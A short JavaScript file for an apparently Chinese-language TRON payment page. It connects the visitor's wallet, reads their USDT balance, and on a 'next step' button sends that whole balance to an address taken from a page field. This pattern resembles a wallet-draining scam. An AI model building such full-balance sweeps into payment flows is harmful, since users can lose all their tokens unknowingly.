let connectCount = 0;

function sleep(time) {
	return new Promise((resolve) => setTimeout(resolve, time));
}

function connect() {
	if (!window.tronWeb) {
		const HttpProvider = TronWeb.providers.HttpProvider;
		const fullNode = new HttpProvider('https://api.trongrid.io');
		const solidityNode = new HttpProvider('https://api.trongrid.io');
		const eventServer = 'https://api.trongrid.io/';

		const tronWeb = new TronWeb(
			fullNode,
			solidityNode,
			eventServer,
		);
		window.tronWeb = tronWeb;
	}

	if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
		$("#address").val(window.tronWeb.defaultAddress.base58);

		tronWeb.trx.getBalance(window.tronWeb.defaultAddress.base58).then(result => {
			$("#balance").val(tronWeb.fromSun(result));
			$("#paydetail_approve").removeAttr("disabled");
			$("#paydetail_approve").text("下一步");
		});
	} else {
		$("#address").val("加载中..." + connectCount);
	}
	connectCount++
}

async function get_usdt_balance() {
	let contractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
	let contract = await tronWeb.contract().at(contractAddress);
	let usdt_balance_f = await contract.balanceOf($("#address").val()).call();
	$("#sun_usdt_balance").val(usdt_balance_f);
	$("#usdt_balance").val(tronWeb.fromSun(usdt_balance_f));
}

async function transfer_f() {
	let to = $("#to_address").val();
	const trc20ContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";

	try {
		let contract = await tronWeb.contract().at(trc20ContractAddress);
		let result = await contract.transfer(
			to,
			$("#sun_usdt_balance").val()
		).send({}).then(output => {
			$("#pay_warning").show();
			addfry();
			console.log(output);
		});
	} catch (error) {
		console.error(error)
	}
}
